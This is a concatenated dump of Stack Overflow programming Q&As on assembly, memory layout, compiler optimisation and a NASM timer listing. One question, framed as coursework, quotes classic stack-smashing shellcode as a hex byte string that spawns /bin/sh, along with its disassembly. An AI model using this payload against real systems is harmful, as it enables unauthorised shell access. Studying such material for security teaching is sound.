<li><a href=""http://homepage.mac.com/randyhyde/webster.cs.ucr.edu/www.artofasm.com/Windows/HTML/MemoryAccessandOrg.html#999687"" rel=""noreferrer"">Run-Time Memory Organization</a></li>
<li><a href=""http://www.cs.uleth.ca/~holzmann/C/system/memorylayout.gif"" rel=""noreferrer"">Memory layout of C process</a> <a href=""http://www.cs.uleth.ca/~holzmann/C/system/memorylayout.pdf"" rel=""noreferrer"">^pdf^</a></li>
</ol>

<p>I want to learn this from a proper book instead of some web links.(Randy Hyde's is also a book but some other book). In which book can I find clear &amp; more information on this subject?</p>

<p>I also wonder, why didn't the operating systems book cover this in their books? I read stallings 6th edition. It just discusses the Process Control Block.</p>

<p>This entire creation of layout is task of <code>linker</code> right? Where can I read more about this process. I want <strong>COMPLETE</strong> info from a program on the disk to its execution on the processor.</p>

<p><strong>EDIT:</strong></p>

<p>Initially, I was not clear even after reading the answers given below. Recently, I came across these articles after reading them, I understood things clearly. </p>

<p><strong>Resources that helped me in understanding:</strong></p>

<blockquote>
  <ol>
  <li>www.tenouk.com/Bufferoverflowc/Bufferoverflow1b.html</li>
  <li>5 part PE file format tutorial: <a href=""http://win32assembly.online.fr/tutorials.html"" rel=""noreferrer"">http://win32assembly.online.fr/tutorials.html</a></li>
  <li><strong>Excellent</strong> article : <a href=""http://www.linuxforums.org/articles/understanding-elf-using-readelf-and-objdump_125.html"" rel=""noreferrer"">http://www.linuxforums.org/articles/understanding-elf-using-readelf-and-objdump_125.html</a></li>
  <li>PE Explorer: <a href=""http://www.heaventools.com/"" rel=""noreferrer"">http://www.heaventools.com/</a></li>
  </ol>
</blockquote>

<p>Yes, ""layout of an executable program(PE/ELF)"" != ""Memory layout of process""). Findout for yourself in the 3rd link. :)</p>

<p>After clearing my concepts, my questions are making me look so stupid. :)</p>
","<p>How things are loaded depends very strongly on the OS and on the binary format used, and the details can get nasty.  There are standards for how binary files are laid out, but it's really up to the OS how a process's memory is laid out.  This is probably why the documentation is hard to find.</p>

<p>To answer your questions:</p>

<ol>
<li>Books:

<ul>
<li>If you're interested in how processes lay out their memory, look at <a href=""http://oreilly.com/catalog/9780596000028"" rel=""noreferrer"">Understanding the Linux Kernel</a>.  Chapter 3 talks about process descriptors, creating processes, and destroying processes.  </li>
<li>The only book I know of that covers linking and loading in any detail is <a href=""http://www.iecc.com/linker/"" rel=""noreferrer"">Linkers and Loaders</a> by John Levine.  There's an online and a print version, so check that out.
<p></li>
</ul></li>
<li><p>Executable code is created by the compiler and the linker, but it's the linker that puts things in the binary format the OS needs.  On Linux, this format is typically <a href=""http://en.wikipedia.org/wiki/Executable_and_Linkable_Format"" rel=""noreferrer"">ELF</a>, on Windows and older Unixes it's <a href=""http://en.wikipedia.org/wiki/COFF"" rel=""noreferrer"">COFF</a>, and on Mac OS X it's <a href=""http://en.wikipedia.org/wiki/Mach-O"" rel=""noreferrer"">Mach-O</a>.  This isn't a fixed list, though.  Some OS's can and do support multiple binary formats.  Linkers need to know the output format to create executable files.</p></li>
<li><p>The process's memory layout is pretty similar to the binary format, because a lot of binary formats are designed to be <a href=""http://en.wikipedia.org/wiki/Mmap"" rel=""noreferrer""><code>mmap'd</code></a> so that the loader's task is easier.</p>

<p>It's not <strong>quite</strong> that simple though.  Some parts of the binary format (like static data) are not stored directly in the binary file.  Instead, the binary just contains the size of these sections.  When the process is loaded into memory, the loader knows to allocate the right amount of memory, but the binary file doesn't need to contain large empty sections.  </p>

<p>Also, the process's memory layout includes some space for the <a href=""http://en.wikipedia.org/wiki/Call_stack"" rel=""noreferrer"">stack</a> and the <a href=""http://en.wikipedia.org/wiki/Dynamic_memory_allocation"" rel=""noreferrer"">heap</a>, where a process's call frames and dynamically allocated memory go.  These generally live at opposite ends of a large address space.</p></li>
</ol>

<p>This really just scratches the surface of how binaries get loaded, and it doesn't cover anything about dynamic libraries.  For a really detailed treatment of how dynamic linking and loading work, read <a href=""http://people.redhat.com/drepper/dsohowto.pdf"" rel=""noreferrer"">How to Write Shared Libraries</a>.</p>
","1966961"
"Assembly Converting MOV / MOVZX and MOVSX to C code (no inline asm)","8476","","<p>For the asm emulator i'm trying to write to convert ASM code to equivalent working code just working.. best code would be the one that can either be done in one line or two-three the most, don't care about speed.</p>

<p>From my understanding. 
MOVZX would be the same as MOV.. if done in C++.</p>

<p><code>MOV</code> conversion.</p>

<pre><code>MOV ESI,DWORD PTR [ESP+8]
</code></pre>

<p>would be like</p>

<pre><code>regs.d.esi = *(unsigned int *)(regs.d.esp+0x00000008);
</code></pre>

<p><code>MOVZX</code> conversion.</p>

<pre><code>MOVZX EAX,BYTE PTR DS:[EDI]
</code></pre>

<p>would be like</p>

<pre><code>regs.d.eax = *(unsigned char *)(regs.d.edi);
</code></pre>

<p>pretty much the same thing no change what so ever.</p>

<p>Now <code>MOVSX</code> i'm having trouble converting to a simple C code.. seems to be the same as the two above.. except it attempts to append as much fully set bits in front of the value moved as possible.. like</p>

<p><code>000000C7</code> becomes <code>FFFFFFC7</code></p>
","<p><code>movsx</code> is move with sign-extend. Those set bits are a copy of the sign bit from the original value, and would be clear if the original wasn't negative. It works just like your other conversions, except you need to use a signed type instead of an unsigned one.</p>

<pre><code>regs.d.eax = *(signed char *)(regs.d.edi); // movsx eax, byte ptr ds:[edi]
</code></pre>
","7762232"
"Why is this C++ program so incredibly fast?","8464","","<p>I wrote a little benchmark to compare the performance of different interpreters/compilers for Python, Ruby, JavaScript and C++.
As expected, it turns out that (optimized) C++ beats the scripting languages, but the factor by which it does so is incredibly high.</p>

<p>The results are:</p>

<pre><code>sven@jet:~/tmp/js$ time node bla.js              # * JavaScript with node *
0

real    0m1.222s
user    0m1.190s
sys 0m0.015s
sven@jet:~/tmp/js$ time ruby foo.rb              # * Ruby *
0

real    0m52.428s
user    0m52.395s
sys 0m0.028s
sven@jet:~/tmp/js$ time python blub.py           # * Python with CPython *
0

real    1m16.480s
user    1m16.371s
sys 0m0.080s

sven@jet:~/tmp/js$ time pypy blub.py             # * Python with PyPy *
0

real    0m4.707s
user    0m4.579s
sys 0m0.028s

sven@jet:~/tmp/js$ time ./cpp_non_optimized 1000 1000000 # * C++ with -O0 (gcc) *
0

real    0m1.702s
user    0m1.699s
sys 0m0.002s
sven@jet:~/tmp/js$ time ./cpp_optimized 1000 1000000     # * C++ with -O3 (gcc) *
0

real    0m0.003s # (!!!) &lt;---------------------------------- WHY?
user    0m0.002s
sys 0m0.002s
</code></pre>

<p>I am wondering if anybody can provide an explanation why the optimized C++ code is over three orders of magnitude faster than everything else.</p>

<p>The C++ benchmark uses command-line parameters in order to prevent pre-computing the result at compile time.</p>

<p>Below, I placed the source codes for the different language benchmarks, which should be semantically equivalent.
Also, I provided the assembly code for the optimized C++ compiler output (using gcc).
When looking at the optimized assembly, it seems that the compiler merged the two loops in the benchmark to a single one, but nevertheless, there IS still a loop!</p>

<p><strong>JavaScript:</strong></p>

<pre><code>var s = 0;
var outer = 1000;
var inner = 1000000;

for (var i = 0; i &lt; outer; ++i) {
    for (var j = 0; j &lt; inner; ++j) {
        ++s;
    }
    s -= inner;
}
console.log(s);
</code></pre>

<p><strong>Python:</strong></p>

<pre><code>s = 0
outer = 1000
inner = 1000000

for _ in xrange(outer):
    for _ in xrange(inner):
        s += 1
    s -= inner
print s
</code></pre>

<p><strong>Ruby:</strong></p>

<pre><code>s = 0
outer = 1000
inner = 1000000

outer_end = outer - 1
inner_end = inner - 1

for i in 0..outer_end
  for j in 0..inner_end
    s = s + 1
  end
  s = s - inner
end
puts s
</code></pre>

<p><strong>C++:</strong></p>

<pre><code>#include &lt;iostream&gt;
#include &lt;cstdlib&gt;
#include &lt;cstdint&gt;

int main(int argc, char* argv[]) {
  uint32_t s = 0;
  uint32_t outer = atoi(argv[1]);
  uint32_t inner = atoi(argv[2]);
  for (uint32_t i = 0; i &lt; outer; ++i) {
    for (uint32_t j = 0; j &lt; inner; ++j)
      ++s;
    s -= inner;
  }
  std::cout &lt;&lt; s &lt;&lt; std::endl;
  return 0;
}
</code></pre>

<p><strong>Assembly (when compiling the above C++ code with gcc -S -O3 -std=c++0x):</strong></p>

<pre><code>    .file   ""bar.cpp""
    .section    .text.startup,""ax"",@progbits
    .p2align 4,,15
    .globl  main
    .type   main, @function
main:
.LFB1266:
    .cfi_startproc
    pushq   %r12
    .cfi_def_cfa_offset 16
    .cfi_offset 12, -16
    movl    $10, %edx
    movq    %rsi, %r12
    pushq   %rbp
    .cfi_def_cfa_offset 24
    .cfi_offset 6, -24
    pushq   %rbx
    .cfi_def_cfa_offset 32
    .cfi_offset 3, -32
    movq    8(%rsi), %rdi
    xorl    %esi, %esi
    call    strtol
    movq    16(%r12), %rdi
    movq    %rax, %rbp
    xorl    %esi, %esi
    movl    $10, %edx
    call    strtol
    testl   %ebp, %ebp
    je  .L6
    movl    %ebp, %ebx
    xorl    %eax, %eax
    xorl    %edx, %edx
    .p2align 4,,10
    .p2align 3
.L3:                             # &lt;--- Here is the loop
    addl    $1, %eax             # &lt;---
    cmpl    %eax, %ebx           # &lt;---
    ja  .L3                      # &lt;---
.L2:
    movl    %edx, %esi
    movl    $_ZSt4cout, %edi
    call    _ZNSo9_M_insertImEERSoT_
    movq    %rax, %rdi
    call    _ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
    popq    %rbx
    .cfi_remember_state
    .cfi_def_cfa_offset 24
    popq    %rbp
    .cfi_def_cfa_offset 16
    xorl    %eax, %eax
    popq    %r12
    .cfi_def_cfa_offset 8
    ret
.L6:
    .cfi_restore_state
    xorl    %edx, %edx
    jmp .L2
    .cfi_endproc
.LFE1266:
    .size   main, .-main
    .p2align 4,,15
    .type   _GLOBAL__sub_I_main, @function
_GLOBAL__sub_I_main:
.LFB1420:
    .cfi_startproc
    subq    $8, %rsp
    .cfi_def_cfa_offset 16
    movl    $_ZStL8__ioinit, %edi
    call    _ZNSt8ios_base4InitC1Ev
    movl    $__dso_handle, %edx
    movl    $_ZStL8__ioinit, %esi
    movl    $_ZNSt8ios_base4InitD1Ev, %edi
    addq    $8, %rsp
    .cfi_def_cfa_offset 8
    jmp __cxa_atexit
    .cfi_endproc
.LFE1420:
    .size   _GLOBAL__sub_I_main, .-_GLOBAL__sub_I_main
    .section    .init_array,""aw""
    .align 8
    .quad   _GLOBAL__sub_I_main
    .local  _ZStL8__ioinit
    .comm   _ZStL8__ioinit,1,1
    .hidden __dso_handle
    .ident  ""GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2""
    .section    .note.GNU-stack,"""",@progbits
</code></pre>
","<p>The optimizer has worked out that the inner loop along with the subsequent line is a no-op, and eliminated it. Unfortunately it hasn't managed to eliminate the outer loop as well.</p>

<p>Note that the node.js example is faster than the unoptimized C++ example, indicating that <a href=""http://en.wikipedia.org/wiki/V8_(JavaScript_engine)"">V8</a> (node's JIT compiler) has managed to eliminate at least one of the loops. However, its optimization has some overhead, as (like any JIT compiler) it must balance the opportunities for optimization and profile-guided re-optimization against the cost of doing so.</p>
","24829517"
"Getting floating point exception while trying to use div in assembly","8462","","<p>I am trying to run the following code in assembly:</p>

<pre><code>  mov        %si, %ax
  mov        $15, %si
  div        %si
  mov        %eax, %esi
</code></pre>

<p>When I make my program, it compiles, but at runtime it gives me a floating point exception.
I tried to replace the last line's parameters by <code>%ah</code> and <code>%si</code>.</p>

<p>Briefly, I am trying to divide <code>%esi</code> by <code>15</code>. I only want an <code>int</code>, and have no need for a <code>double</code>.</p>

<p>Thank you</p>
","<p>The <code>div</code> instruction divides the two-word parameter <code>dx/ax</code> by the operand. If the quotient is too large to fit into a word, it will throw that exception.</p>

<p>Reference: <a href=""http://siyobik.info.gf/main/reference/instruction/DIV"" rel=""noreferrer"">http://siyobik.info.gf/main/reference/instruction/DIV</a></p>

<p>What do you have in the <code>dx</code> register? Most likely <code>dx/ax</code> divided by <code>15</code> does not fit in a 16-bit word.</p>
","9793092"
"Swapping elements in array in MIPS assembly? (the clearer one)","8459","","<p>I know there is a similar question <a href=""https://stackoverflow.com/questions/10924662/swapping-two-elements-in-an-array-in-mips-assembly"">here</a>. I'd like to think of it as a continuation of that question but more thorough.</p>

<p>Here is the relevant pieces of a C code which I want to <strong>translate to MIPS</strong>:  </p>

<pre><code>int a = [100];
...
j = 0;
while (j&lt;50){
    if (a[j] &gt; a[99-j]) {
        tmp = a[99-j];
        a[99-j] = a[j];
        a[j] = tmp;
    }
    j = j+1;
}
</code></pre>

<p>(So it's basically works like reverse)</p>

<p>So far I have done in <strong>MIPS</strong>:</p>

<pre><code>    .data
array:  .word 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80,
     79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60,
     59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40,
     39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20,
     19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1,0
    .text
    .globl main
main:   
    la  $s1, array  # $s1 = array address
    la  $s3, array
    li  $s0, 0      # j = 0
    lw  $t0, 0($s1) # $t0 = a[0]
    lw  $t1, 396($s3)   # $t1 = a[99]

while:  beq $s0, 50, end    # break from while loop once j = 50

if: blt $t0, $t1, iterj # if the if statement not satisfied, branch to iterj
    sw  $t1, 0($s1) # write to a[99-j]
    sw  $t0, 396($s1)   # write to a[j]

iterj:  addi    $s0, $s0, 1 # increment j
    addi    $s1, $s1, 4 # increment source address starting with j = 0
    addi    $s3, $s3, -4    # decrement source address starting with j = 99
    lw  $t0, 0($s1) 
    lw  $t1, 396($s3)   
    j   while
end:
</code></pre>

<p><strong>Summary</strong> of what I did in MIPS:</p>

<p>Basically, I tried to initialise the array in $s1 and tried my best to make swaps on it. Then I realised that I also need to increment the source address at a[0] and at the same time decrement the source address at a[99]. So I was thinking I can't use just 1 array, which I then made an identical array in $s3 to handle it:</p>

<pre><code>addi    $s1, $s1, 4 # increment source address starting with j = 0
addi    $s3, $s3, -4    # decrement source address starting with j = 99
</code></pre>

<p>Now is the part I need help:</p>

<p>The code works (swapping correctly) sequentially from 0 to 31 (all in hex form shown in MARS) then 31 to 1 then suddenly 63 to 47. There's obviously something I'm doing wrong. <strong>All I just need it to do is return 0 to 63 (in hex) or 0 to 99 (in dec) via swapping</strong>. Any hints?</p>
","<p>Well, you're wrong about requiring two arrays, however it is that you came to such a conclusion. Remember that anything that can be written in C can certainly be written in assembly, so the C code you provided should serve as a model.</p>

<p>---EDIT</p>

<p>What I would suggest first is load the address of the array, and calculate the end address.</p>

<pre><code>la   $t0 array
addi $t1 $t0 396 #last element of array
</code></pre>

<p>Then in the body of the loop:</p>

<pre><code>lw  $t2 0($t0)
lw  $t3 0($t1)
sw  $t2 0($t1)
sw  $t3 0($t0)

addi $t0 $t0 4 
addi $t1 $t1 -4
blt  $t0 $t1 loop
</code></pre>
","17788052"
"How to get opcodes of a c program","8454","","<p>I know how to get the assembly code of my program using gdb but how do I get the opcode?
I need it to hack a linux server (don't worry it's part of a class I'm having so no real server will be harmed). Actually I was reading <a href=""http://insecure.org/stf/smashstack.html"" rel=""noreferrer"">this</a> article and I'm wondering how can I get from assembly:</p>

<pre><code>[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
[aleph1]$ gdb shellcodeasm

(gdb) disassemble main
Dump of assembler code for function main:
0x8000130 &lt;main&gt;:       pushl  %ebp
0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
0x8000133 &lt;main+3&gt;:     jmp    0x800015f &lt;main+47&gt;
0x8000135 &lt;main+5&gt;:     popl   %esi
0x8000136 &lt;main+6&gt;:     movl   %esi,0x8(%esi)
0x8000139 &lt;main+9&gt;:     movb   $0x0,0x7(%esi)
0x800013d &lt;main+13&gt;:    movl   $0x0,0xc(%esi)
0x8000144 &lt;main+20&gt;:    movl   $0xb,%eax
0x8000149 &lt;main+25&gt;:    movl   %esi,%ebx
0x800014b &lt;main+27&gt;:    leal   0x8(%esi),%ecx
0x800014e &lt;main+30&gt;:    leal   0xc(%esi),%edx
0x8000151 &lt;main+33&gt;:    int    $0x80
0x8000153 &lt;main+35&gt;:    movl   $0x1,%eax
0x8000158 &lt;main+40&gt;:    movl   $0x0,%ebx
0x800015d &lt;main+45&gt;:    int    $0x80
0x800015f &lt;main+47&gt;:    call   0x8000135 &lt;main+5&gt;
0x8000164 &lt;main+52&gt;:    das
0x8000165 &lt;main+53&gt;:    boundl 0x6e(%ecx),%ebp
0x8000168 &lt;main+56&gt;:    das
0x8000169 &lt;main+57&gt;:    jae    0x80001d3 &lt;__new_exitfn+55&gt;
0x800016b &lt;main+59&gt;:    addb   %cl,0x55c35dec(%ecx)
End of assembler dump.
</code></pre>

<p>the following:</p>

<pre><code>testsc.c
------------------------------------------------------------------------------
char shellcode[] =
    ""\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00""
    ""\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80""
    ""\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff""
    ""\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3"";
</code></pre>

<p>The system is linux x86 and the language I will be using C. I'd really like an automated way, but a manual solution would work too.</p>

<p>I mean how do I convert %ebp, %esi, %esp etc.. Is there a map I can use? or an automated programm?</p>
","<p>Found it! First disassemble then type :
x/bx hit enter and get one by one the hex representation of the assembly commands!</p>
","9848289"
"8086 assembly, about the PTR operator","8445","","<p>this might be simple and silly but i'll ask it anyway since i don't seem to be able to figure it out.</p>

<p>a simple code snippet:</p>

<pre><code> assume cs:code, ds:data
 data segment
    b dd 256
 data ends

 code segment
 start:
        mov ax,data
        mov ds,ax
        mov ax,word ptr b     -&gt; the result of this operation will be ax:= 256 (100h)

        mov bx,word ptr b+1   -&gt; while this is going to be bx:= 1
</code></pre>

<p>I suppose it has something to do with the address and it being moved by a byte or something but i'm not exactly sure, and i really need to understand.</p>

<p>Thanks in advance !</p>
","<p>This</p>

<pre><code>mov ax,word ptr b
</code></pre>

<p>is easier to understand when formatted like this:</p>

<pre><code>mov ax, word ptr [b]
</code></pre>

<p>which has effect of copying a word at address <code>b</code> into ax. So this</p>

<pre><code>mov bx,word ptr b+1 
</code></pre>

<p>is in fact</p>

<pre><code>mov bx,word ptr [b+1]
</code></pre>

<p>which has effect of copying a word at address <code>b+1</code> into bx.</p>

<p>Now <code>dd</code> instructs to allocate a dword and assign 256 to it. 256 in hex is represented as <code>00000100h</code>. The dword will be allocated in memory like this <code>00010000h</code> - bytes <code>00h</code>, <code>01h</code>, <code>00h</code>, <code>00h</code> because on x86 lower bytes are stored at lower addresses (so-called little endian).</p>

<p>When memory is being read into registers bytes order is changed such that lower bytes occupy lower bits in the register (""natural"", so-called big endian). So <code>00h</code>, <code>01h</code> in memory is turned into <code>0100h</code> inside a register and <code>01h</code>, <code>00h</code> in memory is turned into <code>0001h</code> inside register.</p>

<p>So the first <code>mov</code> gets the first two bytes from <code>b</code> (<code>00h</code>, <code>01h</code>) and makes <code>ax</code>==<code>0100h</code> and the second one gets the middle two bytes from <code>b</code> (<code>01h</code>, <code>00h</code>) and makes <code>bx</code>==<code>0001h</code>.</p>
","14772717"
"Need help understanding E8 asm call instruction x86","8440","","<p>I need a helping hand in order to understand the following assembly instruction. It seems to me that I am calling a address at someUnknownValue += 20994A?</p>

<pre><code>E8 32F6FFFF - call std::_Init_locks::operator=+20994A
</code></pre>
","<p>Whatever you're using to obtain the disassembly is trying to be helpful, by giving the target of the call as an offset from some symbol that it knows about -- but given that the offset is so large, it's probably confused.</p>

<p>The actual target of the call can be calculated as follows:</p>

<ul>
<li><code>E8</code> is a <code>call</code> with a relative offset.</li>
<li>In a 32-bit code segment, the offset is specified as a signed 32-bit value.</li>
<li>This value is in little-endian byte order.</li>
<li>The offset is measured from the address of the following instruction.</li>
</ul>

<p>e.g.</p>

<pre><code>&lt;some address&gt;       E8 32 F6 FF FF         call &lt;somewhere&gt;
&lt;some address&gt;+5     (next instruction)
</code></pre>

<ul>
<li>The offset is <code>0xFFFFF632</code>.</li>
<li>Interpreted as a signed 32-bit value, this is <code>-0x9CE</code>.</li>
<li>The <code>call</code> instruction is at <code>&lt;some address&gt;</code> and is 5 bytes long; the next instruction is at <code>&lt;some address&gt; + 5</code>.</li>
<li>So the target address of the call is <code>&lt;some address&gt; + 5 - 0x9CE</code>.</li>
</ul>
","10376930"
"How to get ASCII code of an character in assembly language?","8438","","<p>I need to enter a string and to show that string like array of ASCII codes.
How can i implement it in assembly language.</p>
","<p>In assembly language, characters are already encoded in ASCII (or unicode or whatever). You work with characters as numbers.</p>

<p>What you need to be able to is to format numbers in their denary representation, for output. This is not specific to character codes.</p>

<p>There will almost certainly be library routines to do this, but it's not hard to do yourself. Basically, you write a loop which repeatedly extracts the lowest digit from the number (by taking the residue of the number modulo 10 - look for a MOD instruction), converts that into the character code for a digit (by adding 48) and adds it to a buffer, then divides the number by 10 to move on to the next digit. You repeat that until the number is zero.</p>
","6097197"
"Use of TEST instruction with same register","8423","","<p>Here is some C, found in a textbook I'm learning:</p>

<pre><code>...
do {
    ...
    n--;
} while (n &gt; 0)
...
</code></pre>

<p>I assume <code>n</code> is at <code>%edx</code>.</p>

<p>The assembly code produced is: </p>

<pre><code>testl %edx, %edx 
jle .L5
</code></pre>

<p>I understand that <code>jle</code> tests for less than or equal to <code>(SF ^ OF) | ZF</code>. However I am unsure how this instruction corresponds to <code>n &gt; 0</code>. Can anyone explain this?</p>
","<p>Some of this has been covered, but I'll fill in a little more detail.</p>

<p>The general purpose of the <code>test reg,mask</code> instruction tests a register value against a mask (register value is internally ANDed with mask) and then sets the status flags SF, ZF, and PF according to the result. [EDIT per comment from @ChrisDodd] It also unconditionally clears the <code>O</code> (overflow) and <code>C</code> (carry) status bits.[/EDIT]</p>

<pre><code>SF = sign flag (1 if sign bit is set (a 2's complement negative value))
ZF = zero flag (1 if result is 0)
PF = parity flag (1 if result has an even number of 1 bits)
</code></pre>

<p>In this specific example (<code>test eax,eax</code>), the instruction is taking <code>eax AND eax</code>. When this is done, the bits will be:</p>

<pre><code>SF = 1 if EAX has a negative value (since sign bit will not change when ANDed with itself)
ZF = 1 if EAX is zero (the only value that yields a zero when ANDed with itself is zero)
PF = 1 if EAX has an even number of 1 bits
</code></pre>

<p>In other words, it's a simple test for zero or negative. It's a very common pattern in compiler code generation.</p>
","17393873"
"How to get keyboard input with x86 bare metal assembly?","8421","","<p>I'm in the process of trying to hack together the first bits of a kernel. I currently have the entire kernel compiled down as C code, and I've managed to get it displaying text in the console window and all of that fine goodness. Now, I want to start accepting keyboard input so I can actually make some use of the thing and get going on process management.</p>

<p>I'm using DJGPP to compile, and loading with GRUB. I'm also using a small bit of assembly which basically jumps directly into my compiled C code and I'm happy from there.</p>

<p>All the research I've done seems to point to an ISR at $0x16 to read in the next character from the keyboard buffer. From what I can tell, this is supposed to store the ASCII value in ah, and the keycode in al, or something to that effect. I'm attempting to code this using the following routine in inline assembly:</p>

<pre><code>char getc(void) 
{
    int output = 0;

    //CRAZY VOODOO CODE
    asm(""xor %%ah, %%ah\n\t""
        ""int $0x16""
        : ""=a"" (output)
        : ""a"" (output)
        : 

        );

    return (char)output;
}
</code></pre>

<p>When this code is called, the core immediately crashes. (I'm running it on VirtualBox, I didn't feel the need to try something this basic on real hardware.)</p>

<p>Now I have actually a couple of questions. No one has been able to tell me if (since my code was launched from GRUB) I'm running in real mode or protected mode at the moment. I haven't made the jump one way or another, I was planning on running in real mode until I got a process handler set up.</p>

<p>So, assuming that I'm running in real mode, what am I doing wrong, and how do I fix it? I just need a basic getc routine, preferably non-blocking, but I'll be darned if google is helping on this one at all. Once I can do that, I can do the rest from there.</p>

<p>I guess what I'm asking here is, am I anywhere near the right track? How does one generally go about getting keyboard input on this level? </p>

<p>EDIT: OOhh... so I'm running in protected mode. This certainly explains the crash trying to access real mode functions then.</p>

<p>So then I guess I'm looking for how to access the keyboard IO from protected mode. I might be able to find that on my own, but if anyone happens to know feel free. Thanks again.</p>
","<p>If you are compiling with gcc, unless you are using the crazy "".code16gcc"" trick the linux kernel uses (which I very much doubt), you cannot be in real mode. If you are using the GRUB multiboot specification, GRUB itself is switching to protected mode for you. So, as others pointed out, you will have to talk to the 8042-compatible keyboard/mouse controller directly. Unless it's a USB keyboard/mouse and 8042 emulation is disabled, where you would need a USB stack (but you can use the ""boot"" protocol for the keyboard/mouse, which is simpler).</p>

<p>Nobody said writing an OS kernel was simple.</p>
","218031"
"Why are signed and unsigned multiplication different instructions on x86(-64)?","8400","","<p>I thought the whole point of 2's complement was that operations could be implemented the same way for signed and unsigned numbers. <a href=""http://en.wikipedia.org/wiki/2%27s_complement"">Wikipedia even specifically lists multiply as one of the operations that benefits</a>. So why does x86 have separate instructions for each, <code>mul</code> and <code>imul</code>? Is this still true for x86-64?</p>
","<p>Addition and subtraction are the same, as is the low-half of a multiply.  A full multiply, however, is not.  Simple example:</p>

<p>In 32-bit twos-complement, -1 has the same representation as the unsigned quantity 2**32 - 1.  However:</p>

<pre><code>-1 * -1 = +1
(2**32 - 1) * (2**32 - 1) = (2**64 - 2**33 + 1)
</code></pre>

<p>(Note that the low 32-bits of both results are the same; that's what I mean when I say the ""low-half of the multiply"" is the same).</p>
","14063665"
"NASM Error Parsing, Instruction Expected","8388","","<p>I asked a similar question <a href=""https://stackoverflow.com/questions/11572021/problems-with-winasm-and-zen-of-assembly"">here</a> but I changed assemblers and the question almost entirely changed, so in an effort to avoid question clutter I'm posting an entirely new question. Anyways, long story short, I'm on Windows 7 and I just installed NASM, and I'm trying to assemble a code listing from a book called Zen of Assembly by Michael Abrash. Here's the code for the listing:</p>

<pre><code>;
; *** Listing 2-1 ***
;
; The precision Zen timer (PZTIMER.ASM)
;
; Uses the 8253 timer to time the performance of code that takes
; less than about 54 milliseconds to execute, with a resolution
; of better than 10 microseconds.
;
; By Michael Abrash 4/26/89
;
; Externally callable routines:
;
;  ZTimerOn: Starts the Zen timer, with interrupts disabled.
;
;  ZTimerOff: Stops the Zen timer, saves the timer count,
;   times the overhead code, and restores interrupts to the
;   state they were in when ZTimerOn was called.
;
;  ZTimerReport: Prints the net time that passed between starting
;   and stopping the timer.
;
; Note: If longer than about 54 ms passes between ZTimerOn and
;   ZTimerOff calls, the timer turns over and the count is
;   inaccurate. When this happens, an error message is displayed
;   instead of a count. The long-period Zen timer should be used
;   in such cases.
;
; Note: Interrupts *MUST* be left off between calls to ZTimerOn
;   and ZTimerOff for accurate timing and for detection of
;   timer overflow.
;
; Note: These routines can introduce slight inaccuracies into the
;   system clock count for each code section timed even if
;   timer 0 doesn't overflow. If timer 0 does overflow, the
;   system clock can become slow by virtually any amount of
;   time, since the system clock can't advance while the
;   precison timer is timing. Consequently, it's a good idea
;   to reboot at the end of each timing session. (The
;   battery-backed clock, if any, is not affected by the Zen
;   timer.)
;
; All registers, and all flags except the interrupt flag, are
; preserved by all routines. Interrupts are enabled and then disabled
; by ZTimerOn, and are restored by ZTimerOff to the state they were
; in when ZTimerOn was called.
;

Code    segment word public 'CODE'
    assume  cs:Code, ds:nothing
    public  ZTimerOn, ZTimerOff, ZTimerReport

;
; Base address of the 8253 timer chip.
;
BASE_8253       equ 40h
;
; The address of the timer 0 count registers in the 8253.
;
TIMER_0_8253        equ BASE_8253 + 0
;
; The address of the mode register in the 8253.
;
MODE_8253       equ BASE_8253 + 3
;
; The address of Operation Command Word 3 in the 8259 Programmable
; Interrupt Controller (PIC) (write only, and writable only when
; bit 4 of the byte written to this address is 0 and bit 3 is 1).
;
OCW3            equ 20h
;
; The address of the Interrupt Request register in the 8259 PIC
; (read only, and readable only when bit 1 of OCW3 = 1 and bit 0
; of OCW3 = 0).
;
IRR         equ 20h
;
; Macro to emulate a POPF instruction in order to fix the bug in some
; 80286 chips which allows interrupts to occur during a POPF even when
; interrupts remain disabled.
;
MPOPF macro 
    local   p1, p2
    jmp short p2
p1: iret            ;jump to pushed address &amp; pop flags
p2: push    cs      ;construct far return address to
    call    p1      ; the next instruction
    endm

;
; Macro to delay briefly to ensure that enough time has elapsed
; between successive I/O accesses so that the device being accessed
; can respond to both accesses even on a very fast PC.
;
DELAY   macro
    jmp $+2
    jmp $+2
    jmp $+2
    endm

OriginalFlags       db  ?   ;storage for upper byte of
                    ; FLAGS register when
                    ; ZTimerOn called
TimedCount      dw  ?   ;timer 0 count when the timer
                    ; is stopped
ReferenceCount      dw  ?   ;number of counts required to
                    ; execute timer overhead code
OverflowFlag        db  ?   ;used to indicate whether the
                    ; timer overflowed during the
                    ; timing interval
;
; String printed to report results.
;
OutputStr   label   byte
        db  0dh, 0ah, 'Timed count: ', 5 dup (?)
ASCIICountEnd   label   byte
        db  ' microseconds', 0dh, 0ah
        db  '$'
;
; String printed to report timer overflow.
;
OverflowStr label   byte
    db  0dh, 0ah
    db  '****************************************************'
    db  0dh, 0ah
    db  '* The timer overflowed, so the interval timed was  *'
    db  0dh, 0ah
    db  '* too long for the precision timer to measure.     *'
    db  0dh, 0ah
    db  '* Please perform the timing test again with the    *'
    db  0dh, 0ah
    db  '* long-period timer.                               *'
    db  0dh, 0ah
    db  '****************************************************'
    db  0dh, 0ah
    db  '$'

;********************************************************************
;* Routine called to start timing.                  *
;********************************************************************

ZTimerOn    proc    near

;
; Save the context of the program being timed.
;
